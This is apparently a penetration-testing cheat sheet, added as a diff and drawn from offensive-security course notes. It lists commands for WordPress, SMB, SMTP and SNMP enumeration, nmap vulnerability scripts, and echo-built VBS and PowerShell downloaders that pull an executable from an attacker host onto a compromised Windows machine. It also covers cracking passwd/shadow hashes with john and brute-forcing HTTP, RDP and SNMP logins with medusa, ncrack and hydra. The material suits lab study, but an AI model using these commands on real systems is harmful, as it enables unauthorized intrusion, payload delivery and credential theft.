@@ -1,0 +1,255 @@
+WORDPRESS ENUMERATION
+
+wpscan --url 10.0.2.4 --enumerate vp
+
+wpscan --url https://192.168.161.xxx/ --disable-tls-checks  --enumerate vp --enumerate u
+
+wpscan --url http://192.168.161.xxx/ --enumerate u
+
+
+PATH 
+
+# export PATH=$PATH:/root/learning/bin/
+# source ~/.bashrc
+# echo $PATH
+
+export PATH=home/xxx
+
+export PATH=/usr/local/bin:/xxx/xxx:/usr/
+
+
+SIMPLEHTTPSERVER
+
+python -m SimpleHTTPServer 80
+
+
+
+WINDOWS EXPLOIT SUGGESTER COMMANDS
+
+execute -f "cmd.exe /c systeminfo > systeminfo2.txt"
+
+download systeminfo.txt
+
+~/Windows-Exploit-Suggester
+
+python2 windows-exploit-suggester.py --database 2019-02-04-mssb.xls --systeminfo ../systeminfo.txt --quiet
+
+
+
+SMB Enumeration
+
+SMB1 – Windows 2000, XP and Windows 2003.
+o SMB2 – Windows Vista SP1 and Windows 2008
+o SMB2.1 – Windows 7 and Windows 2008 R2
+o SMB3 – Windows 8 and Windows 2012.
+
+nmap -v -p 139,445 -oG smb.txt 10.xx.xx.xx
+
+
+NetBIOS information
+
+nbtscan -r 10.xx.xx.xx
+
+rpcclient -U "" 10.xx.xx.xx
+
+
+
+Nmap SMB NSE Scripts
+
+ls -l /usr/share/nmap/scripts/smb*
+
+ls -l /usr/share/nmap/scripts/|grep smb
+
+OS discovery and enumeration of various pieces of information from the protocol
+
+nmap -v -p 139, 445 --script=smb-os-discovery 10.xx.xx.xx
+
+
+SMB protocol vulnerabilities
+
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.xx.xx.xx
+
+enum4linux -v
+
+enum4linux -a
+ 
+ 
+
+SMTP Enumeration
+
+ls -l /usr/share/nmap/scripts/smtp*
+
+-rw-r--r-- 1 root root  4309 May 15  2018 /usr/share/nmap/scripts/smtp-brute.nse
+-rw-r--r-- 1 root root  4771 May 15  2018 /usr/share/nmap/scripts/smtp-commands.nse
+-rw-r--r-- 1 root root 12006 May 15  2018 /usr/share/nmap/scripts/smtp-enum-users.nse
+-rw-r--r-- 1 root root  5873 May 15  2018 /usr/share/nmap/scripts/smtp-ntlm-info.nse
+-rw-r--r-- 1 root root 10150 May 15  2018 /usr/share/nmap/scripts/smtp-open-relay.nse
+-rw-r--r-- 1 root root   716 May 15  2018 /usr/share/nmap/scripts/smtp-strangeport.nse
+-rw-r--r-- 1 root root 14740 May 15  2018 /usr/share/nmap/scripts/smtp-vuln-cve2010-4344.nse
+-rw-r--r-- 1 root root  7661 May 15  2018 /usr/share/nmap/scripts/smtp-vuln-cve2011-1720.nse
+-rw-r--r-- 1 root root  7584 May 15  2018 /usr/share/nmap/scripts/smtp-vuln-cve2011-1764.nse
+
+
+
+SNMP Enumeration Simple Network Management Protocol (SNMP)
+
+ ls -l /usr/share/nmap/scripts/snmp*
+
+-rw-r--r-- 1 root root  7486 May 15  2018 /usr/share/nmap/scripts/snmp-brute.nse
+-rw-r--r-- 1 root root  4375 May 15  2018 /usr/share/nmap/scripts/snmp-hh3c-logins.nse
+-rw-r--r-- 1 root root  5178 May 15  2018 /usr/share/nmap/scripts/snmp-info.nse
+-rw-r--r-- 1 root root 28629 May 15  2018 /usr/share/nmap/scripts/snmp-interfaces.nse
+-rw-r--r-- 1 root root  5924 May 15  2018 /usr/share/nmap/scripts/snmp-ios-config.nse
+-rw-r--r-- 1 root root  4143 May 15  2018 /usr/share/nmap/scripts/snmp-netstat.nse
+-rw-r--r-- 1 root root  4418 May 15  2018 /usr/share/nmap/scripts/snmp-processes.nse
+-rw-r--r-- 1 root root  1848 May 15  2018 /usr/share/nmap/scripts/snmp-sysdescr.nse
+-rw-r--r-- 1 root root  2557 May 15  2018 /usr/share/nmap/scripts/snmp-win32-services.nse
+-rw-r--r-- 1 root root  2726 May 15  2018 /usr/share/nmap/scripts/snmp-win32-shares.nse
+-rw-r--r-- 1 root root  4649 May 15  2018 /usr/share/nmap/scripts/snmp-win32-software.nse
+-rw-r--r-- 1 root root  2003 May 15  2018 /usr/share/nmap/scripts/snmp-win32-users.nse
+
+onesixtyone -c community -i ips
+
+
+Vulnerability Scanning with Nmap
+
+cd /usr/share/nmap/scripts/
+ls -l *vuln*
+
+
+httpvuln- cve2010-2861 
+
+nmap -v -p 80 --script=http-vuln-cve2010-2861 192.xx.xx.xx
+
+
+
+The ftp-anon NSE 
+
+nmap -v -p 21 --script=ftp-anon.nse 192.xx.xx.xx
+
+
+security level of an SMB server with the smb-security-mode NSE script
+
+nmap -v -p 139, 445 --script=smb-security-mode 10.xx.xx.xx
+
+
+nmap data to verify that all domain web servers have been patched against CVE-2011-319242, an Apache denial of service vulnerability
+
+nmap -v -p 80 --script=http-vuln-cve2011-3192 10.xx.xx.xx-230
+
+nmap -v -p 80 --script all
+
+OPENVAS
+https://127.0.0.1:9392/omp
+
+
+TO ACCOUNT FOR TRAFFIC
+iptables -I INPUT 1 -s 10.0.0.19 -j ACCEPT
+
+iptables -I OUTPUT 1 -d 10.0.0.19 -j ACCEPT
+
+iptables -Z
+
+iptables -vn -L
+
+
+
+SEARCHSPLOIT Exploits 
+
+searchsploit x
+
+
+
+
+
+VBS script that acts as a simple HTTP downloader
+
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+
+
+POWERSHELL SCRIPT
+
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.xx.xx.xx/scsiaccess.exe" >>wget.ps1
+echo $file = "scsiaccess.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+
+JOHN PASSWORD CRACKING
+
+john 127.0.0.1.pwdump
+
+john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+
+In order to crack Linux hashes with john, you will need to first use the unshadow
+utility to combine the passwd and shadow files from the compromised system
+
+unshadow passwd-file.txt shadow-file.txt
+
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+
+
+METASPLOIT auxiliary SCANNER
+
+use auxiliary/scanner/snmp/snmp_enum
+
+use auxiliary/scanner/smb/smb_version
+
+use auxiliary/scanner/http/webdav_scanner
+
+use auxiliary/scanner/ftp/ftp_login
+
+use auxiliary/scanner/smb/smb_version
+
+db_nmap 10.xxx.xxx.xxx-254
+
+
+
+CEWL
+
+cewl www.megacorpone.com -m 6 -w mega-cewl.txt
+
+john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled
+
+medusa -h admin.megacorpone.com -u OFFSET -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
+
+
+HTTP Brute Force
+medusa -h 10.xxx.xxx.xxx -u admin -P password-file.txt -M http -m DIR:/admin -T 10
+
+RDP Brute force
+ncrack -vv --user offsecurity -P password-file.txt rdp:10.xxx.xxx.xxx
+
+SNMP Brute Force
+hydra -P password-file.txt -v 10.xxx.xxx.xxx snmp
